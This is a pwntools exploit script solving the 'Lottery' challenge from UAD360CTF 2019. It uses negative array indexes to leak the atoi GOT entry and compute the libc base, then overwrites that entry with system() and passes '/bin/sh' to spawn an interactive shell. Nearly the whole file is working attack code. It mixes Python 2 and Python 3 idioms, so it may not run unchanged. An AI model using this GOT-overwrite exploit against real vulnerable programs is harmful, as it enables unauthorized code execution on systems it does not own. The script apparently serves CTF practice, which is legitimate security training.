from pwn import *

# --- Info ---
# CTF: UAD360CTF 2019
# Date: -
# Challenge: Lottery
# Description: Arbitrary read and write via negative indexes (underflow)
# --- End Info ---

#context.log_level = 'debug'
context.terminal = ["tmux", "sp", "-h"]
context.endian = 'little'

PATH = './lottery'
LIBC = './libc-2.27.so'
ENV = {"LD_PRELOAD":"./libc-2.27.so"}
libc  = ELF(LIBC, checksec = False)
binary  = ELF(PATH, checksec = False)

REMOTE = 0

HOST = '127.0.0.1'
PORT = 1337

def edit_lottery(idx, high, low):
    r.recvuntil('option>')
    r.sendline('1')
    r.recvuntil('to edit:\n')
    r.sendline(str(int(idx)))
    r.recvuntil('number:\n')
    r.sendline(str(int(low)))
    r.recvuntil('bought:\n')
    r.sendline(str(int(high)))

def show_lottery(idx):
    r.recvuntil('option>')
    r.sendline('2')
    r.recvuntil('to show:\n')
    r.sendline(str(int(idx)))
    data1 = r.recvuntil('\n')
    data2 = r.recvuntil('\n')
    low = (data1.split('number: '))[1].split('\n')[0]
    high = (data2.split('tickets: '))[1].split('\n')[0]
    return int(high), int(low)
    
def pad(addr):
    return addr + '\x00'*(8-len(addr))

'''
>>> hex(get_low(0x41414141deadbeef))
'0xdeadbeef'
>>> 
'''
def get_low(addr):
    return int(hex(addr & 0xffffffff).replace('L', ''), 16)

'''
>>> hex(get_high(0xdeadbeef41414141))
'0xdeadbeef'
>>> 
'''
def get_high(addr):
    return int(hex((addr & 0xffffffff00000000) >> 0x20).replace('L', ''), 16)
    
'''
>>> hex(mix_addr(0xdeadbeef, 0x41414141))
'0xdeadbeef41414141'
>>> 
'''
def mix_addr(high, low):
    return int(hex(high << 32 | low).replace('L',''), 16)

LIST_ADDR = 0x6010a0

context.binary = PATH
r = remote(HOST, PORT) if REMOTE else process(PATH, env=ENV)
#gdb.attach(r)
#pause()

offset = -((LIST_ADDR - binary.got['atoi']) / 0x8)

# leak phase (arbitrary read)

hi_atoi, lo_atoi = show_lottery(offset)

leak_atoi = mix_addr(hi_atoi, lo_atoi)

libc.address = leak_atoi - libc.symbols['atoi']

binsh_addr = next(libc.search('/bin/sh'))

log.info(f'Leaked: atoi @ {hex(leak_atoi)}')
log.info(f'Leaked: libc base @ {hex(libc.address)}')
log.info('Leaked: system @ ' + hex(libc.symbols['system']))
log.info('Leaked: "/bin/sh" @ ' + hex(binsh_addr))

# arbitrary write

hi_system = get_high(libc.symbols['system'])
lo_system = get_low(libc.symbols['system'])

edit_lottery(offset, hi_system, lo_system)

#pause()

r.sendline(p64(binsh_addr))

r.interactive()
r.close()
